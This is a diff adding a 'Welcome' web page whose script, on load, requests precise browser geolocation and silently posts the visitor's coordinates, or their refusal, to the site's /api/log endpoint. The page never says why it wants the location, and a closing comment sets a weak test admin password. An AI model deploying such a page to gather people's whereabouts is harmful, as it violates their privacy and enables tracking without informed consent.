@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Welcome</title>
+    <style>
+        body {
+            font-family: system-ui, sans-serif;
+            max-width: 600px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+
+        small {
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Welcome!</h1>
+    <p id="status">Loading…</p>
+
+    <script>
+        async function send(payload) {
+            try {
+                await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        window.addEventListener('load', () => {
+            const status = document.getElementById('status');
+            if (!('geolocation' in navigator)) {
+                status.textContent = 'Geolocation not supported.';
+                return send({ permission: 'unsupported' });
+            }
+
+            let best = null;
+            let sent = false;
+
+            const finish = () => {
+                if (sent) return;
+                sent = true;
+                navigator.geolocation.clearWatch(watchId);
+                if (best) {
+                    status.textContent = `Location captured (±${Math.round(best.accuracy)} m). Thanks!`;
+                    send({
+                        permission: 'granted',
+                        latitude: best.latitude,
+                        longitude: best.longitude,
+                        accuracyMeters: best.accuracy
+                    });
+                }
+            };
+
+            const watchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    if (!best || pos.coords.accuracy < best.accuracy) best = pos.coords;
+                    if (best.accuracy <= 50) finish();   // good enough, stop early
+                },
+                (err) => {
+                    status.textContent = `Location not shared (code ${err.code}: ${err.message})`;
+                    if (!sent) { sent = true; send({ permission: 'denied', reason: `${err.code}: ${err.message}` }); }
+                },
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+            );
+
+            setTimeout(finish, 15000); // give up refining after 15 seconds and send the best we have
+        });
+    </script>
+</body>
+
+</html>
+
+<!-- $env:ADMIN_PASSWORD="test"; node server.js
+http://localhost:5500 -->
